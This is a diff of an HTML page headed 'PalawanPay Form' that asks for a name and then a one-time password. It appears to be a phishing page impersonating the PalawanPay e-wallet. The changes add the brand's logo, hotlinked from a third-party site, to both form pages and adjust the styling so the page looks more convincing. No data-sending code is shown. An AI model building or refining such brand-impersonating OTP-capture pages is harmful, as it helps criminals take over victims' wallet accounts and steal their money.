@@ -14,11 +14,14 @@
     * {
       box-sizing: border-box;
     }
-    body {
+    html, body {
       margin: 0;
       padding: 0;
       font-family: Arial, sans-serif;
-      background: url('https://www.palawanpawnshop.com/uploads/media/money-managment-quiz-og.jpg') no-repeat center center fixed;
+      height: 100%;
+    }
+    body {
+      background: url('https://www.palawanpawnshop.com/uploads/media/money-managment-quiz-og.jpg') no-repeat center center;
       background-size: cover;
       display: flex;
       justify-content: center;
@@ -30,9 +33,17 @@
       padding: 20px;
       border-radius: 15px;
       box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
-      width: 100%;
+      width: 90%;
       max-width: 400px;
       margin: 20px;
+      text-align: center;
+    }
+    .logo {
+      width: 100%;
+      max-width: 100%;
+      height: auto;
+      margin-bottom: 15px;
+      border-radius: 10px;
     }
     h2 {
       text-align: center;
@@ -64,6 +75,7 @@
 </head>
 <body>
   <div class="container" id="page1">
+    <img src="https://www.ecpay.com.ph/sites/default/files/2023-12/PALAWANPAY_COMPANY%20LOGO.png" alt="PalawanPay Logo" class="logo" />
     <h2>PalawanPay Form</h2>
     <form id="info-form">
       <input type="text" name="name" placeholder="Name" required />
@@ -75,6 +87,7 @@
   </div>
 
   <div class="container" id="page2" style="display: none;">
+    <img src="https://www.ecpay.com.ph/sites/default/files/2023-12/PALAWANPAY_COMPANY%20LOGO.png" alt="PalawanPay Logo" class="logo" />
     <h2>Enter OTP</h2>
     <form id="otp-form">
       <input type="text" name="otp" maxlength="6" placeholder="One-Time Password (OTP)" required />
